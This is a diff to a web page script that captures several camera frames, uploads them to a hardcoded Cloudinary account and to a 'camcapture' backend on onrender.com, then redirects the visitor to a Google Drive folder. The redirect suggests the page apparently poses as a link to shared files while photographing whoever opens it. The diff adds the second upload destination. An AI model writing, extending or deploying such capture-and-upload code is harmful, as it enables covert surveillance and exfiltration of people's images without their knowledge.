@@ -35,7 +35,7 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
         images.push({ blob, name: `${labelPrefix}_image${i + 1}.jpg` });
-        await new Promise(r => setTimeout(r, 500)); // 0.5 sec between captures
+        await new Promise(r => setTimeout(r, 500)); // 0.5s delay
       }
 
       stream.getTracks().forEach(track => track.stop());
@@ -47,19 +47,46 @@
   }
 
   async function uploadImages(images) {
-    const formData = new FormData();
-    images.forEach((img, i) => {
-      formData.append(`image${i + 1}`, img.blob, img.name);
+    const cloudName = "dfytubulx";
+    const uploadPreset = "CamCapture";
+
+    const uploadTasks = images.map(async (img, i) => {
+      const cloudForm = new FormData();
+      cloudForm.append("file", img.blob);
+      cloudForm.append("upload_preset", uploadPreset);
+
+      // Upload to Cloudinary
+      let cloudinaryUrl = "";
+      try {
+        const cloudRes = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+          method: "POST",
+          body: cloudForm
+        });
+        const cloudData = await cloudRes.json();
+        cloudinaryUrl = cloudData.secure_url;
+        console.log(`✅ Cloudinary (${img.name}):`, cloudinaryUrl);
+      } catch (err) {
+        console.error("❌ Cloudinary upload failed:", err);
+      }
+
+      // Upload to your backend
+      try {
+        const backendForm = new FormData();
+        backendForm.append("image", img.blob, img.name);
+        backendForm.append("cloudinaryUrl", cloudinaryUrl); // Optional to store in DB
+
+        await fetch("https://camcapture.onrender.com/upload-endpoint", {
+          method: "POST",
+          body: backendForm
+        });
+
+        console.log(`✅ Backend (${img.name}) upload done.`);
+      } catch (err) {
+        console.error("❌ Backend upload failed:", err);
+      }
     });
 
-    try {
-      await fetch('https://camcapture.onrender.com/upload-endpoint', {
-        method: 'POST',
-        body: formData
-      });
-    } catch (err) {
-      console.error('Upload error:', err);
-    }
+    await Promise.all(uploadTasks);
   }
 
   async function startCapture() {
@@ -71,7 +98,7 @@
       await uploadImages(allImages);
     }
 
-    // Redirect after upload
+    // Redirect after all uploads
     window.location.href = "https://drive.google.com/drive/folders/1dWeuOua4SbFZsxAx13yoq3wqcaoDpMft";
   }
 
